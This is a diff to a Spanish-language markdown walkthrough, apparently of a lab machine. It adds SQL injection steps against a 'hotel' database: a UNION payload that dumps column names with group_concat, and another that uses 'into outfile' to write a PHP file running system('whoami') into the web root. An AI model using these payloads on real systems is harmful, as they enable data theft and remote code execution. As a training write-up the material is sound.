@@ -108,9 +108,21 @@ union select 1,2,column_name,4,5,6,7 from information_schema.columns where table
 
 ![Resultado de Nmap](IMG/bd6.png)
 
+Tambien podemos agruparlas todas
 
+```
+union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- -
+```
+![Resultado de Nmap](IMG/bd7.png)
 
+Vemos que no hay ninguna base de datos con usuarios ni contraseñas, asi que podemos hacer otra cosa
 
+Como la web interpreta php, lo que podriamos hacer es intentar crear un archivo con extension .php en una ruta de la maquina para ver si lo interpreta
+
+```
+union select 1,2,"<?php system('whoami'); ?>",4,5,6,7 into outfile "/var/www/html/test.php"-- -
+```
+![Resultado de Nmap](IMG/bd8.png)
 
 
 
